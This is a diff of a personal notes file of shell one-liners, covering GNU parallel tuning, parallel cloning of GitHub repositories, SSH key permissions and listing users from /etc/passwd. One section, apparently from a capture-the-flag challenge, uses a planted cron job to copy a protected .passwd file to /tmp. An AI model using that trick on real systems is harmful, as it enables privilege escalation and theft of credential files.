@@ -28,7 +28,7 @@ CPU Model: Intel(R) Xeon(R) CPU E5-2680 v3 @ 2.50GHz
 CPU Cores: `printf '%s' $(nproc)` = 48
 ```
 
-Atm I use  $((nproc + 1)) for the best perfomance, for threads I trying to use $((nproc + 1)) x 2 for best perfomance. 
+Use `$((nproc + 1))` for the best perfomance, for threads I trying to use `$((nproc + 1)) x 2` for best perfomance. 
 
 ```sh
 export NUMCPUS=$(nproc)
@@ -42,7 +42,7 @@ And then:
 parallel -j${NUMCPUSPLUSONE} -n${NUMTHREADS} ....
 ```
 
-### Clone starred github repos in parallel with unlimited speed, clone 20 repos in parallel.
+### Clone starred github repos in parallel with unlimited speed, clone `20` repos in `parallel`.
 
 [Also shared here](https://www.commandlinefu.com/commands/view/26591/clone-starred-github-repos-in-parallel-with-unlimited-speed-this-example-will-clone-25-repositories-in-parallel-at-same-time.)
 
@@ -111,7 +111,8 @@ done < test
 time seq 1000|parallel -a 1 -j1000 wget
 ```
 
-### Exploiting crontab - If a script is running with higher privileges
+### Exploit Cronie - If a script is running with higher privileges
+
 ```sh
 echo "cat /challenge/app-script/ch4/.passwd >/tmp/cracked" > \
     cron.d/go && chmod a+x cron.d/go \
@@ -119,7 +120,7 @@ echo "cat /challenge/app-script/ch4/.passwd >/tmp/cracked" > \
     cat /tmp/cracked
 ```
 
-### Fix broken SSH permissions for client
+### Fix `broken` SSH permissions for client
 
 ```sh
 chmod 700 ~/.ssh
@@ -134,10 +135,23 @@ chmod 600 ~/.ssh/mozilla_rsa
 chmod 644 ~/.ssh/mozilla_rsa.pub
 ```
 
-### Get user ID
+### Find users that is `not` used in /etc/passwd
+
+```
+for shell in $(</etc/shells);do
+  count=`grep -c $shell /etc/passwd`
+  if [ $count -eq 0 ]; then echo $shell not used in /etc/passwd;fi
+done
+```
+
+### Print users
 
 ```sh
-cat /etc/passwd | grep shell4cracked
+getent passwd | awk -F ':' '{print $1}' > allusers
+
+cut -d: -f1 /etc/passwd
+sed 's/:.*//' /etc/passwd
+awk -F: '{print $1}' /etc/passwd
 ```
 
 ### C program to get a shell
